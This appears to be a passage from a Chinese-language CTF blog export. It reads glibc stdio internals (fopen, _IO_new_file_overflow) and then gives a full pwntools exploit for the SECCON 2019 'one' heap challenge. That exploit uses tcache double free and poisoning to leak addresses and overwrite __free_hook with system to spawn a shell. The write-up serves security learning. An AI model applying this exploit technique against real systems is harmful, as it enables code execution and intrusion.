<h3 id="IO-new-file-overflow"><a href="#IO-new-file-overflow" class="headerlink" title="_IO_new_file_overflow"></a>_IO_new_file_overflow</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_overflow (FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  _IO_doallocbuf (f);</span><br><span class="line">	  _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">	 logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">	 read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">	 makes room for subsequent output.</span></span><br><span class="line"><span class="comment">	 Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">	 alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">	  _IO_free_backup_area (f);</span><br><span class="line">	  f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">				   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">	  f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">	f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">	f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="库内公共接口函数的实现流程示例"><a href="#库内公共接口函数的实现流程示例" class="headerlink" title="库内公共接口函数的实现流程示例"></a>库内公共接口函数的实现流程示例</h1><blockquote>
<p>对genops.c的二次封装</p>
</blockquote>
<h2 id="1-fopen为例"><a href="#1-fopen为例" class="headerlink" title="1. fopen为例"></a>1. fopen为例</h2><blockquote>
<p>主要实现流程，具体函数实现有兴趣的自行观看吧。</p>
</blockquote>
<h3 id="a-fopen-internal（iofopen-c）"><a href="#a-fopen-internal（iofopen-c）" class="headerlink" title="a. __fopen_internal（iofopen.c）"></a>a. __fopen_internal（iofopen.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="b-IO-no-init-and-IO-old-init（genops-c）"><a href="#b-IO-no-init-and-IO-old-init（genops-c）" class="headerlink" title="b. _IO_no_init and _IO_old_init（genops.c）"></a>b. _IO_no_init and _IO_old_init（genops.c）</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_old_init (FILE *fp, <span class="type">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line">  fp-&gt;_flags = _IO_MAGIC|flags;</span><br><span class="line">  fp-&gt;_flags2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (stdio_needs_locking)</span><br><span class="line">    fp-&gt;_flags2 |= _IO_FLAGS2_NEED_LOCK;</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_chain = <span class="literal">NULL</span>; <span class="comment">/* Not necessary. */</span></span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_markers = <span class="literal">NULL</span>;</span><br><span class="line">  fp-&gt;_cur_column = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_JUMPS_OFFSET</span></span><br><span class="line">  fp-&gt;_vtable_offset = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_init (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> orientation,</span><br><span class="line">	     <span class="keyword">struct</span> _IO_wide_data *wd, <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *jmp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_old_init (fp, flags);</span><br><span class="line">  fp-&gt;_mode = orientation;</span><br><span class="line">  <span class="keyword">if</span> (orientation &gt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data = wd;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_ptr = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_write_end = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_backup_base = <span class="literal">NULL</span>;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_save_end = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_wide_vtable = jmp;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* Cause predictable crash when a wide function is called on a byte</span></span><br><span class="line"><span class="comment">       stream.  */</span></span><br><span class="line">    fp-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) <span class="number">-1L</span>;</span><br><span class="line">  fp-&gt;_freeres_list = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="c-IO-new-file-init-internal-fileops-c"><a href="#c-IO-new-file-init-internal-fileops-c" class="headerlink" title="c._IO_new_file_init_internal(fileops.c)"></a>c._IO_new_file_init_internal(fileops.c)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_init_internal (<span class="keyword">struct</span> _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* POSIX.1 allows another file handle to be used to change the position</span></span><br><span class="line"><span class="comment">     of our file descriptor.  Hence we actually don&#x27;t know the actual</span></span><br><span class="line"><span class="comment">     position before we do the first fseek (and until a following fflush). */</span></span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="d-IO-new-file-init-internal-fileops-c"><a href="#d-IO-new-file-init-internal-fileops-c" class="headerlink" title="d._IO_new_file_init_internal(fileops.c)"></a>d._IO_new_file_init_internal(fileops.c)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_file_fopen (FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode,</span><br><span class="line">		    <span class="type">int</span> is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> oflags = <span class="number">0</span>, omode;</span><br><span class="line">  <span class="type">int</span> read_write;</span><br><span class="line">  <span class="type">int</span> oprot = <span class="number">0666</span>;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  FILE *result;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cs;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *last_recognized;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> (*mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;r&#x27;</span>:</span><br><span class="line">      omode = O_RDONLY;</span><br><span class="line">      read_write = _IO_NO_WRITES;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_TRUNC;</span><br><span class="line">      read_write = _IO_NO_READS;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      omode = O_WRONLY;</span><br><span class="line">      oflags = O_CREAT|O_APPEND;</span><br><span class="line">      read_write = _IO_NO_READS|_IO_IS_APPENDING;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  last_recognized = mode;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> (*++mode)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;\0&#x27;</span>:</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">	  omode = O_RDWR;</span><br><span class="line">	  read_write &amp;= _IO_IS_APPENDING;</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">	  oflags |= O_EXCL;</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">	  last_recognized = mode;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_MMAP;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_NOTCANCEL;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">	  oflags |= O_CLOEXEC;</span><br><span class="line">	  fp-&gt;_flags2 |= _IO_FLAGS2_CLOEXEC;</span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">	  <span class="comment">/* Ignore.  */</span></span><br><span class="line">	  <span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">			  is32not64);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Test whether the mode string specifies the conversion.  */</span></span><br><span class="line">      cs = <span class="built_in">strstr</span> (last_recognized + <span class="number">1</span>, <span class="string">&quot;,ccs=&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (cs != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="comment">/* Yep.  Load the appropriate conversions and set the orientation</span></span><br><span class="line"><span class="comment">	     to wide.  */</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> <span class="title">gconv_fcts</span> <span class="title">fcts</span>;</span></span><br><span class="line">	  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span>;</span></span><br><span class="line">	  <span class="type">char</span> *endp = __strchrnul (cs + <span class="number">5</span>, <span class="string">&#x27;,&#x27;</span>);</span><br><span class="line">	  <span class="type">char</span> *ccs = <span class="built_in">malloc</span> (endp - (cs + <span class="number">5</span>) + <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (ccs == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">int</span> malloc_err = errno;  <span class="comment">/* Whatever malloc failed with.  */</span></span><br><span class="line">	      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">	      __set_errno (malloc_err);</span><br><span class="line">	      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  *((<span class="type">char</span> *) __mempcpy (ccs, cs + <span class="number">5</span>, endp - (cs + <span class="number">5</span>))) = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	  strip (ccs, ccs);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (__wcsmbs_named_conv (&amp;fcts, ccs[<span class="number">2</span>] == <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">				   ? upstr (ccs, cs + <span class="number">5</span>) : ccs) != <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/* Something went wrong, we cannot load the conversion modules.</span></span><br><span class="line"><span class="comment">		 This means we cannot proceed since the user explicitly asked</span></span><br><span class="line"><span class="comment">		 for these.  */</span></span><br><span class="line">	      (<span class="type">void</span>) _IO_file_close_it (fp);</span><br><span class="line">	      <span class="built_in">free</span> (ccs);</span><br><span class="line">	      __set_errno (EINVAL);</span><br><span class="line">	      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	  <span class="built_in">free</span> (ccs);</span><br><span class="line"></span><br><span class="line">	  assert (fcts.towc_nsteps == <span class="number">1</span>);</span><br><span class="line">	  assert (fcts.tomb_nsteps == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">	  fp-&gt;_wide_data-&gt;_IO_write_ptr = fp-&gt;_wide_data-&gt;_IO_write_base;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Clear the state.  We start all over again.  */</span></span><br><span class="line">	  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">	  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">	  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">	  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">	  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">	  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">	  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">	  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">	  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="库内二次封装的函数调用其的实现流程"><a href="#库内二次封装的函数调用其的实现流程" class="headerlink" title="库内二次封装的函数调用其的实现流程"></a>库内二次封装的函数调用其的实现流程</h1><blockquote>
<p>此函数是对库内标准IO接口的二次封装，淡然也有非IO函数调用上述标准IO接口</p>
<p>待续…</p>
</blockquote>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>IO</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>IO_FILE</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>一些低版本的tcache练习</title>
    <url>/2024/08/11/%E4%B8%80%E4%BA%9B%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84tcache%E7%BB%83%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="SECCON-2019-Online-CTF-one-pwn-heap-glibc-2-27"><a href="#SECCON-2019-Online-CTF-one-pwn-heap-glibc-2-27" class="headerlink" title="SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)"></a>SECCON 2019 Online CTF: one (pwn, heap, glibc-2.27)</h2><blockquote>
<p>主要利用了tcache的uaf和double-free漏洞，还有Tcache Poisoning和Tcache dup漏洞，可谓是一个大杂侩，虽然说题目逻辑简单，但是利用过程不是很容易，一次只能分配一个恶意块，所以需要有全局思维，要考虑如何利用漏洞并且需要在漏洞利用完还可以继续利用，因此比较复杂。对数字及其敏感，非常混乱，建议边调试边尝试。</p>
<p>哎还得是tcache，fastbin搞两下就崩了哈哈哈，可惜高版本tcache利用也成过去式了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./one&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Input memo &gt; &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(<span class="string">&quot;\n&quot;</span>).strip()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ex</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##heap地址泄露</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">2</span>*p64(<span class="number">0x131</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>))</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line"></span><br><span class="line">chunkadd = u64(show().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment">## 此处是为了让tcache有更多的块</span></span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line"><span class="comment">##libc地址泄露</span></span><br><span class="line">create(p64(chunkadd-<span class="number">0x150</span>+<span class="number">0x20</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(p64(chunkadd-<span class="number">0x150</span>+<span class="number">0x20</span>)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(<span class="string">b&#x27;\xff\xff\xff\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    de()</span><br><span class="line">base = u64(show().ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">sys = base +elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">##复写hook</span></span><br><span class="line">create(<span class="number">10</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">de()</span><br><span class="line">de()</span><br><span class="line">fhook = base + elf.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">create(p64(fhook)+<span class="number">2</span>*p64(<span class="number">0x0</span>)+p64(<span class="number">0x171</span>))</span><br><span class="line">create(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(p64(sys))</span><br><span class="line">create(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">de()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc:&quot;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;chunkadd:&quot;</span>,<span class="built_in">hex</span>(chunkadd))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;__free_hook&quot;</span>,<span class="built_in">hex</span>(fhook))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

